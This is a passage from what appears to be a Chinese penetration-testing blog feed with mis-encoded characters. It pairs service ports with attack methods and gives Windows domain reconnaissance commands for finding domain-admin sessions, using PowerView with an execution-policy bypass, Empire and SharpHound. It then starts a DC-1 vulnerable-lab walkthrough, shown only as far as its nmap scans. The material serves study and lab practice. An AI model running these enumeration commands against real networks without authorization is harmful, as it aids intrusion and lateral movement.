<td align="left">80ã€443ã€8080</td>
<td>å¸¸è§çš„WebæœåŠ¡ç«¯å£</td>
<td>Webæ”»å‡»ã€çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´</td>
</tr>
<tr>
<td align="left">7001ã€7002</td>
<td>Weblogicæ§åˆ¶å°</td>
<td>Javaååºåˆ—åŒ–ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">8080ã€8089</td>
<td>JBoss/Resin/Jetty/Jenkins</td>
<td>ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">9090</td>
<td>WebSphereæ§åˆ¶å°</td>
<td>Javaååºåˆ—åŒ–ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">4848</td>
<td>GlassFishæ§åˆ¶å°</td>
<td>å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">1352</td>
<td>Lotus Dominoé‚®ä»¶æœåŠ¡</td>
<td>å¼±å£ä»¤ã€ä¿¡æ¯æ³„éœ²ã€çˆ†ç ´</td>
</tr>
<tr>
<td align="left">10000</td>
<td>webminæ§åˆ¶é¢æ¿</td>
<td>å¼±å£ä»¤</td>
</tr>
</tbody></table>
<h3 id="04-æ•°æ®åº“æœåŠ¡ç«¯å£"><a href="#04-æ•°æ®åº“æœåŠ¡ç«¯å£" class="headerlink" title="04.æ•°æ®åº“æœåŠ¡ç«¯å£"></a>04.æ•°æ®åº“æœåŠ¡ç«¯å£</h3><table>
<thead>
<tr>
<th>ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th><strong>ä½¿ç”¨è¯´æ˜</strong></th>
</tr>
</thead>
<tbody><tr>
<td>3306</td>
<td>MySQLæ•°æ®åº“</td>
<td>æ³¨å…¥ã€ææƒã€çˆ†ç ´</td>
</tr>
<tr>
<td>1433</td>
<td>MSSQLæ•°æ®åº“</td>
<td>æ³¨å…¥ã€ææƒã€SAå¼±å£ä»¤ã€çˆ†ç ´</td>
</tr>
<tr>
<td>1521</td>
<td>Oracleæ•°æ®åº“</td>
<td>TNSçˆ†ç ´ã€æ³¨å…¥ã€åå¼¹Shell</td>
</tr>
<tr>
<td>5432</td>
<td>PostgreSQLæ•°æ®åº“</td>
<td>çˆ†ç ´ã€æ³¨å…¥ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td>27017ã€27018</td>
<td>MongoDBæ•°æ®åº“</td>
<td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td>6379</td>
<td>Redisæ•°æ®åº“</td>
<td>æœªæˆæƒè®¿é—®ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td>5000</td>
<td>Sysbase/DB2æ•°æ®åº“</td>
<td>çˆ†ç ´ã€æ³¨å…¥</td>
</tr>
</tbody></table>
<h3 id="05-é‚®ä»¶æœåŠ¡å™¨ç«¯å£"><a href="#05-é‚®ä»¶æœåŠ¡å™¨ç«¯å£" class="headerlink" title="05.é‚®ä»¶æœåŠ¡å™¨ç«¯å£"></a>05.é‚®ä»¶æœåŠ¡å™¨ç«¯å£</h3><table>
<thead>
<tr>
<th>ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>25</td>
<td>SMTPé‚®ä»¶æœåŠ¡</td>
<td>é‚®ä»¶ä¼ªé€ </td>
</tr>
<tr>
<td>110</td>
<td>POP3åè®®</td>
<td>çˆ†ç ´ã€å—…æ¢</td>
</tr>
<tr>
<td>143</td>
<td>IMAPåè®®</td>
<td>çˆ†ç ´</td>
</tr>
</tbody></table>
<h3 id="06-ç½‘ç»œå¸¸è§åè®®ç«¯å£"><a href="#06-ç½‘ç»œå¸¸è§åè®®ç«¯å£" class="headerlink" title="06.ç½‘ç»œå¸¸è§åè®®ç«¯å£"></a>06.ç½‘ç»œå¸¸è§åè®®ç«¯å£</h3><table>
<thead>
<tr>
<th>ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>53</td>
<td>DNSåŸŸåç³»ç»Ÿ</td>
<td>å…è®¸åŒºåŸŸä¼ é€ã€DNSåŠ«æŒã€ç¼“å­˜æŠ•æ¯’ã€æ¬ºéª—</td>
</tr>
<tr>
<td>67ã€68</td>
<td>DHCPæœåŠ¡</td>
<td>åŠ«æŒã€æ¬ºéª—</td>
</tr>
<tr>
<td>161</td>
<td>SNMPåè®®</td>
<td>çˆ†ç ´ã€æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯</td>
</tr>
</tbody></table>
<h3 id="07-ç‰¹æ®ŠæœåŠ¡ç«¯å£"><a href="#07-ç‰¹æ®ŠæœåŠ¡ç«¯å£" class="headerlink" title="07.ç‰¹æ®ŠæœåŠ¡ç«¯å£"></a>07.ç‰¹æ®ŠæœåŠ¡ç«¯å£</h3><table>
<thead>
<tr>
<th><strong>ç«¯å£å·</strong></th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>2181</td>
<td>ZooKeeperæœåŠ¡</td>
<td>æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td>8069</td>
<td>ZabbixæœåŠ¡</td>
<td>è¿œç¨‹æ‰§è¡Œã€SQLæ³¨å…¥</td>
</tr>
<tr>
<td>9200ã€9300</td>
<td>ElasticsearchæœåŠ¡</td>
<td>è¿œç¨‹æ‰§è¡Œ</td>
</tr>
<tr>
<td>11211</td>
<td>MemchachedæœåŠ¡</td>
<td>æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td>512ã€513ã€514</td>
<td>Linux rexecæœåŠ¡</td>
<td>çˆ†ç ´ã€è¿œç¨‹ç™»å½•</td>
</tr>
<tr>
<td>873</td>
<td>rsyncæœåŠ¡</td>
<td>åŒ¿åè®¿é—®ã€æ–‡ä»¶ä¸Šä¼ </td>
</tr>
<tr>
<td>3690</td>
<td>SVNæœåŠ¡</td>
<td>svnæ³„éœ²ã€æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td>50000</td>
<td>SAP Management Console</td>
<td>è¿œç¨‹æ‰§è¡Œ</td>
</tr>
<tr>
<td>88</td>
<td>KerberosæœåŠ¡</td>
<td>ç›‘å¬KDCç¥¨æ®è¯·æ±‚ï¼Œç¥¨æ®ä¼ªé€ </td>
</tr>
<tr>
<td>5985</td>
<td>WinRM</td>
<td>HTTP/HTTPSç›‘å¬</td>
</tr>
</tbody></table>
<h2 id="0x06-å®šä½åŸŸç®¡ç†å‘˜"><a href="#0x06-å®šä½åŸŸç®¡ç†å‘˜" class="headerlink" title="0x06.å®šä½åŸŸç®¡ç†å‘˜"></a>0x06.å®šä½åŸŸç®¡ç†å‘˜</h2><p><code>ä¸¤ç§æ–¹æ³•:ç®¡ç†å‘˜æ—¥å¿—ä¸ç™»å…¥ä¼šè¯ï¼Œä¸»è¦æ˜¯ä¼šè¯</code></p>
<h3 id="01-æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ"><a href="#01-æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ" class="headerlink" title="01.æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ"></a>01.æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>

<h3 id="02-psloggedon-exe"><a href="#02-psloggedon-exe" class="headerlink" title="02.psloggedon.exe"></a>02.psloggedon.exe</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">psloggedon.exe \\10.10.10.10</span><br></pre></td></tr></table></figure>

<blockquote>
<p>é€šè¿‡æ³¨å†Œè¡¨HKEY_USERSçš„keyå€¼æŸ¥è¯¢è°ç™»å…¥è¿‡</p>
</blockquote>
<p><code>å‚æ•°</code></p>
<table>
<thead>
<tr>
<th><strong>å‚æ•°</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td>â€“</td>
<td>æ˜¾ç¤ºæ”¯æŒçš„é€‰é¡¹å’Œç”¨äºè¾“å‡ºå€¼çš„åº¦é‡å•ä½ã€‚</td>
</tr>
<tr>
<td>-l</td>
<td>ä»…æ˜¾ç¤ºæœ¬åœ°ç™»å½•ï¼Œè€Œä¸æ˜¾ç¤ºæœ¬åœ°å’Œç½‘ç»œèµ„æºç™»å½•ã€‚</td>
</tr>
<tr>
<td>-x</td>
<td>ä¸æ˜¾ç¤ºç™»å½•æ—¶é—´ã€‚</td>
</tr>
<tr>
<td>\\computername</td>
<td>æŒ‡å®šè¦ä¸ºå…¶åˆ—å‡ºç™»å½•ä¿¡æ¯çš„è®¡ç®—æœºçš„åç§°ã€‚</td>
</tr>
<tr>
<td>username</td>
<td>æŒ‡å®šç”¨æˆ·åï¼Œåœ¨ç½‘è·¯ä¸­æœç´¢è¯¥ç”¨æˆ·ç™»å…¥çš„è®¡ç®—æœº</td>
</tr>
</tbody></table>
<h3 id="03-PVEFindADUser-exe"><a href="#03-PVEFindADUser-exe" class="headerlink" title="03.PVEFindADUser.exe"></a>03.PVEFindADUser.exe</h3><blockquote>
<p>ç”¨äºæŸ¥æ‰¾æ´»åŠ¨ç›®å½•ç”¨æˆ·ç™»å½•ä½ç½®ï¼Œæšä¸¾åŸŸç”¨æˆ·ï¼ŒæŸ¥æ‰¾åœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»å½•çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ï¼Œé€šè¿‡RDPç™»å½•çš„ç”¨æˆ·ï¼Œç”¨äºè¿è¡ŒæœåŠ¡å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ã€‚è¿è¡Œè¯¥å·¥å…·éœ€è¦.NET Framework2.0ç¯å¢ƒï¼Œå¹¶ä¸”å…·å¤‡ç®¡ç†å‘˜æƒé™ã€‚</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PVEFindADUser.exe --current</span><br></pre></td></tr></table></figure>

<h3 id="04-netview-exe"><a href="#04-netview-exe" class="headerlink" title="04.netview.exe"></a>04.netview.exe</h3><blockquote>
<p>ä½¿ç”¨WinAPIæšä¸¾ç³»ç»Ÿï¼Œåˆ©ç”¨NetSessionEnumæ‰¾å¯»ç™»å½•ä¼šè¯ï¼Œåˆ©ç”¨NetShareEnumæ‰¾å¯»å…±äº«ï¼Œåˆ©ç”¨NetWkstaUserEnumæšä¸¾ç™»å½•çš„ç”¨æˆ·ã€‚å¤§éƒ¨åˆ†åŠŸèƒ½ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p>
</blockquote>
<p><code>å‚æ•°</code></p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>-f filename.txt</td>
<td>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ä»¥ä»ä¸­æå–ä¸»æœºåˆ—è¡¨</td>
</tr>
<tr>
<td>-e filename.txt**</td>
<td>æŒ‡å®šè¦æ’é™¤çš„ä¸»æœºåæ–‡ä»¶</td>
</tr>
<tr>
<td>-d domain</td>
<td>æŒ‡å®šè¦ä»ä¸­æ‹‰å‡ºä¸»æœºåˆ—è¡¨çš„åŸŸï¼Œå¦‚æœæœªæŒ‡å®šï¼Œåˆ™ä½¿ç”¨å½“å‰åŸŸ</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netview.exe -filenmae.txt &gt; res.txt</span><br></pre></td></tr></table></figure>

<h3 id="05-nmapçš„NSEè„šæœ¬"><a href="#05-nmapçš„NSEè„šæœ¬" class="headerlink" title="05.nmapçš„NSEè„šæœ¬"></a>05.nmapçš„NSEè„šæœ¬</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smb-enum-domains.nse    #å¯¹åŸŸæ§åˆ¶å™¨è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥è·å–ä¸»æœºä¿¡æ¯ã€ç”¨æˆ·ã€å¯ä½¿ç”¨å¯†ç ç­–ç•¥çš„ç”¨æˆ·ç­‰</span><br><span class="line">smb-enum-groups.nse</span><br><span class="line">smb-enum-processes.nse    #è·å–ä¸»æœºè¿›ç¨‹</span><br><span class="line">smb-enum-services.nse</span><br><span class="line">smb-enum-sessions.nse    #è·å–ç”¨æˆ·ç™»å…¥ä¼šè¯</span><br><span class="line">smb-enum-shares.nse        #éå†è¿œç¨‹ä¸»æœºçš„å…±äº«ç›®å½•</span><br><span class="line">smb-enum-users.nse        #ç”¨æˆ·æƒé™ä¸å¤Ÿå¯ä»¥ä½¿ç”¨å®ƒå¯¹åŸŸæ§è¿›è¡Œæ‰«æ</span><br><span class="line">smb-flood.nse</span><br><span class="line">smb-ls.nse</span><br><span class="line">smb-mbenum.nse</span><br><span class="line">smb-os-discovery.nse    #è¿›è¡Œä¿¡æ¯æ”¶é›†</span><br></pre></td></tr></table></figure>

<h3 id="06-PowerViewè„šæœ¬"><a href="#06-PowerViewè„šæœ¬" class="headerlink" title="06.PowerViewè„šæœ¬"></a>06.PowerViewè„šæœ¬</h3><p><code>æ‰«æç›®æ ‡ç”¨æˆ·é›†ï¼Œä¸éœ€è¦ç®¡ç†æƒé™</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\powerview.ps1; Invoke-UserHunter&#125;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="07-Empireçš„user-hunteræ¨¡å—"><a href="#07-Empireçš„user-hunteræ¨¡å—" class="headerlink" title="07.Empireçš„user_hunteræ¨¡å—"></a>07.Empireçš„user_hunteræ¨¡å—</h3><p><code>æŸ¥æ‰¾åŸŸç®¡ç†å‘˜ç™»å…¥çš„æœºå™¨</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">usemodule powershell/situational_awareness/network/powerview/user_hunter</span><br></pre></td></tr></table></figure>

<h2 id="0x07-è¿›ç¨‹æŸ¥è¯¢"><a href="#0x07-è¿›ç¨‹æŸ¥è¯¢" class="headerlink" title="0x07.è¿›ç¨‹æŸ¥è¯¢"></a>0x07.è¿›ç¨‹æŸ¥è¯¢</h2><h3 id="01-netsess-exe"><a href="#01-netsess-exe" class="headerlink" title="01.netsess.exe"></a>01.netsess.exe</h3><p><code>ä¼šè¯æŸ¥è¯¢</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsess.exe -h</span><br></pre></td></tr></table></figure>

<h3 id="02-äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨"><a href="#02-äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨" class="headerlink" title="02.äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨"></a>02.äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨</h3><blockquote>
<p>åŸŸæ§æ·»åŠ åˆ°dcs.txtï¼ŒåŸŸç®¡ç†å‘˜æ·»åŠ åˆ°admins.txtï¼Œä¸netsessåœ¨åŒä¸€ç›®å½•</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; session.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type session.txt | @findstr /I %a</span><br></pre></td></tr></table></figure>

<h3 id="03-æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡"><a href="#03-æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡" class="headerlink" title="03.æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡"></a>03.æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡</h3><p><code>é¦–å…ˆè·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure>

<p><code>å°†ç›®æ ‡ç³»ç»Ÿæ·»åŠ åˆ°ips.txtï¼ŒåŸŸç®¡ç†å‘˜æ·»åŠ åˆ°admins.txtï¼Œè¿è¡Œä»¥ä¸‹è„šæœ¬(å½“å‰è®¡ç®—æœºIP)</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt;output.txt &amp;&amp; for /F %n in (admins.txt) do @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp;pause</span><br></pre></td></tr></table></figure>

<h3 id="04-åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯"><a href="#04-åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯" class="headerlink" title="04.åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯"></a>04.åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯</h3><blockquote>
<p>å°†ç›®æ ‡ç³»ç»Ÿæ·»åŠ åˆ°ips.txtï¼ŒåŸŸç®¡ç†å‘˜æ·»åŠ åˆ°admins.txtï¼Œè¿è¡Œä»¥ä¸‹è„šæœ¬</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+]Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure>

<p><code>ä½¿ç”¨nbtscanè¿›è¡ŒæŸ¥è¯¢</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+]Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure>

<h2 id="0x08-PowerShellæ”¶é›†åŸŸä¿¡æ¯"><a href="#0x08-PowerShellæ”¶é›†åŸŸä¿¡æ¯" class="headerlink" title="0x08.PowerShellæ”¶é›†åŸŸä¿¡æ¯"></a>0x08.PowerShellæ”¶é›†åŸŸä¿¡æ¯</h2><p><code>Powershellçš„å››ç§æƒé™</code></p>
<blockquote>
<p>Restrictedï¼šé»˜è®¤è®¾ç½®ï¼Œä¸å…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬ã€‚</p>
<p>Allsignedï¼šåªèƒ½è¿è¡Œç»è¿‡è¯ä¹¦éªŒè¯çš„è„šæœ¬ã€‚</p>
<p>Unrestirctedï¼šæƒé™æœ€é«˜ï¼Œå…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬ã€‚</p>
<p>RemoteSignedï¼šå¯¹æœ¬åœ°è„šæœ¬ä¸è¿›è¡Œé™åˆ¶ï¼Œå¯¹æ¥è‡ªç½‘ç»œçš„è„šæœ¬å¿…é¡»éªŒè¯å…¶ç­¾åã€‚</p>
</blockquote>
<h3 id="01-æƒé™ç›¸å…³"><a href="#01-æƒé™ç›¸å…³" class="headerlink" title="01.æƒé™ç›¸å…³"></a>01.æƒé™ç›¸å…³</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Get-ExecutionPolicy        #æŸ¥çœ‹æƒé™</span><br><span class="line">Set-ExecutionPolicy UnRestricted    #ä¿®æ”¹æƒé™</span><br></pre></td></tr></table></figure>

<h3 id="02-å¯¼å…¥powerview-ps1"><a href="#02-å¯¼å…¥powerview-ps1" class="headerlink" title="02.å¯¼å…¥powerview.ps1"></a>02.å¯¼å…¥powerview.ps1</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure>

<h3 id="03-å¸¸ç”¨å‘½ä»¤"><a href="#03-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="03.å¸¸ç”¨å‘½ä»¤"></a>03.å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PowerViewçš„å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š</span><br><span class="line">Get-NetDomainï¼šè·å–å½“å‰ç”¨æˆ·æ‰€åœ¨çš„åŸŸã€‚</span><br><span class="line">Get-NetUserï¼šè·å–æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetDomainControllerï¼šè·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetComputerï¼šè·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetOUï¼šè·å–åŸŸä¸­çš„OUä¿¡æ¯ã€‚</span><br><span class="line">Get-NetGroupï¼šè·å–æ‰€æœ‰åŸŸå†…ç»„æˆå‘˜çš„ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetFileServerï¼šæ ¹æ®SPNè·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetShareï¼šè·å–å½“å‰åŸŸå†…æ‰€æœ‰çš„ç½‘ç»œå…±äº«ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetSessionï¼šè·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯ã€‚</span><br><span class="line">Get-NetRDPSessionï¼šè·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥ã€‚</span><br><span class="line">Get-NetProcessï¼šè·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹ã€‚</span><br><span class="line">Get-UserEventï¼šè·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—ã€‚</span><br><span class="line">Get-ADObjectï¼šè·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡ã€‚</span><br><span class="line">Get-NetGPOï¼šè·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡ã€‚</span><br><span class="line">Get-DomainPolicyï¼šè·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥ã€‚</span><br><span class="line">Invoke-UserHunterï¼šè·å–åŸŸç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºä¿¡æ¯åŠè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™ã€‚</span><br><span class="line">Invoke-ProcessHunterï¼šé€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ·ã€‚</span><br><span class="line">Invoke-UserEventHunterï¼šæ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»å½•è¿‡å“ªäº›æœºå™¨ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="0x09-BloodHoundåŸŸå†…åˆ†æå·¥å…·"><a href="#0x09-BloodHoundåŸŸå†…åˆ†æå·¥å…·" class="headerlink" title="0x09.BloodHoundåŸŸå†…åˆ†æå·¥å…·"></a>0x09.BloodHoundåŸŸå†…åˆ†æå·¥å…·</h2><p><code>é¦–å…ˆè¿›è¡Œä¿¡æ¯é‡‡é›†ï¼Œç„¶åå¯¼å…¥åˆ†æå³å¯</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>å†…ç½‘å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-1</title>
    <url>/2020/08/21/DC-1/</url>
    <content><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote>
<p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>
<p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p>
<p>To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p>
<p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</p>
<p>There are five flags in total, but the ultimate goal is to find and read the flag in rootâ€™s home directory. You donâ€™t even need to be root to do this, however, you will require root privileges.</p>
<p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p>
<p>Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-ä¸Šnmap"><a href="#0x01-ä¸Šnmap" class="headerlink" title="0x01.ä¸Šnmap"></a>0x01.ä¸Šnmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ3å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 07:08 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:45:E3:65 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># ls</span></span><br><span class="line">nmap.sP</span><br></pre></td></tr></table></figure>

<h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†22/80/111/41087ç«¯å£</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># nmap -A 192.168.1.3 -p 1-65535 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 07:19 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 